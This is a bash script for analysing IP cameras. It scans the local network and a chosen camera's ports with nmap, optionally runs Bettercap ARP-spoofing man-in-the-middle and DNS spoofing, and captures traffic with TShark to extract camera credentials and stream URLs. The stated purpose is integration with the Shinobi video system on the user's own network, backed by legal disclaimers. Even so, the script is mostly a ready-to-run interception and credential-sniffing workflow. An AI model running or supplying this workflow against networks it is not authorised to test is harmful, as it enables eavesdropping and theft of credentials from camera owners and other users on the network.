#!/usr/bin/env bash
#
# camera_analysis.sh
# Version: 1.0
#
# This script automates the process of identifying IP cameras, intercepting their traffic,
# and extracting critical details for integration with Shinobi or other video management solutions.
#
# DISCLAIMER:
# - This script is provided for educational purposes only.
# - Use it only on devices and networks that you own or have permission to analyze.
# - Unauthorized interception of traffic may be illegal in your jurisdiction.
# - By running this script, you agree to assume all legal liabilities.

set -e

# ============ CONFIGURATIONS ============

# Define the local network range
NETWORK_RANGE="192.168.1.0/24"
# Network interface (e.g., wlan0, eth0, etc.)
INTERFACE="wlan0"

# ============ HELPER FUNCTIONS ============

function banner() {
  echo "=================================================="
  echo "  Camera Network Analysis Script"
  echo "  For Educational and Legal Usage Only"
  echo "=================================================="
  echo
}

function check_root() {
  if [[ $EUID -ne 0 ]]; then
    echo "[ERROR] This script must be run as root or with sudo."
    exit 1
  fi
}

function disclaimer() {
  echo "[LEGAL DISCLAIMER]"
  echo "This script is intended for use on your own devices and network."
  echo "Do not use it for illegal activities or on networks/devices you do not own."
  echo "Proceed at your own risk and ensure you comply with all applicable laws."
  echo
}

function pause_for_disclaimer() {
  echo "Press ENTER if you understand and accept these terms, or Ctrl+C to abort."
  read
}

# ============ MAIN EXECUTION ============

banner
check_root
disclaimer
pause_for_disclaimer

# 1. Network Scan for Cameras
echo "[INFO] Scanning network for devices..."
./scripts/network_scan.sh "$NETWORK_RANGE"

echo
echo "[INFO] Identify the camera's IP address from the above scan."
echo "Please enter the IP address of the camera you want to analyze:"
read CAMERA_IP

# 2. Port Scanning on Camera
echo "[INFO] Scanning ports on camera ($CAMERA_IP)..."
nmap -sV -p- "$CAMERA_IP"

# 3. MITM Attack Setup with Bettercap (Optional)
echo
read -p "Do you want to run a MITM attack using Bettercap? (y/N): " MITM_CHOICE
if [[ "$MITM_CHOICE" =~ ^[Yy]$ ]]; then
  echo "[INFO] Starting ARP spoofing with Bettercap..."
  ./scripts/bettercap_mitm.sh "$INTERFACE" "$CAMERA_IP"
else
  echo "[INFO] Skipping ARP spoofing."
fi

# 4. DNS Spoofing (Optional)
echo
read -p "Do you want to perform DNS spoofing with Bettercap? (y/N): " DNS_SPOOF_CHOICE
if [[ "$DNS_SPOOF_CHOICE" =~ ^[Yy]$ ]]; then
  echo "[INFO] Enabling DNS spoofing..."
  sudo bettercap -eval "dns.spoof on"
else
  echo "[INFO] Skipping DNS spoofing."
fi

# 5. Capturing Packets with Wireshark or TShark
echo
echo "[INFO] You can capture packets using Wireshark or TShark."
echo "An example script is in scripts/wireshark_sniffer.sh"
read -p "Press ENTER to open TShark example script, or Ctrl+C to stop."
./scripts/wireshark_sniffer.sh "$INTERFACE"

echo
echo "[INFO] Done. Check the captured packets in the logs/ folder."
echo "Analyze them to find camera credentials, RTSP URLs, or ONVIF endpoints for Shinobi integration."

echo "[SUCCESS] Exiting camera_analysis.sh"